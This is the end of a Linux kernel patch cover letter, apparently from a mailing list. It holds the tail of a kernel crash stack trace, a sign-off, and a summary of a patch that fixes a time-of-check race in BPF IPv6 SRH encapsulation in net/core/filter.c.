+[  276.969307][    C3]  handle_softirqs+0x2ae/0x8b0=0D
+[  276.969626][    C3]  ? __pfx_handle_softirqs+0x10/0x10=0D
+[  276.970004][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
+[  276.970390][    C3]  ? rcu_is_watching+0x12/0xc0=0D
+[  276.970711][    C3]  run_ksoftirqd+0x3d/0x70=0D
+[  276.971006][    C3]  smpboot_thread_fn+0x521/0x8c0=0D
+[  276.971362][    C3]  ? smpboot_thread_fn+0x56/0x8c0=0D
+[  276.971732][    C3]  ? __pfx_smpboot_thread_fn+0x10/0x10=0D
+[  276.972103][    C3]  ? __pfx_smpboot_thread_fn+0x10/0x10=0D
+[  276.972485][    C3]  kthread+0x27e/0x350=0D
+[  276.972756][    C3]  ? _raw_spin_unlock_irq+0x28/0x50=0D
+[  276.973108][    C3]  ? __pfx_kthread+0x10/0x10=0D
+[  276.973424][    C3]  ret_from_fork+0x31/0x70=0D
+[  276.973789][    C3]  ? __pfx_kthread+0x10/0x10=0D
+[  276.974263][    C3]  ret_from_fork_asm+0x1a/0x30=0D
+[  276.974794][    C3]  </TASK>=0D
+[  276.975278][    C3] Kernel Offset: disabled=0D
+[  276.975641][    C3] Rebooting in 86400 seconds..=0D
+=0D
+-----END crash log-----=0D
+=0D
+Best regards,=0D
+Luxiao Xu=0D
+=0D
+Luxiao Xu (1):=0D
+  bpf: fix TOCTOU in IPv6 SRH encapsulation=0D
+=0D
+ net/core/filter.c | 25 +++++++++++++++++--------=0D
+ 1 file changed, 17 insertions(+), 8 deletions(-)=0D
+=0D
+-- =0D
+2.43.0=0D
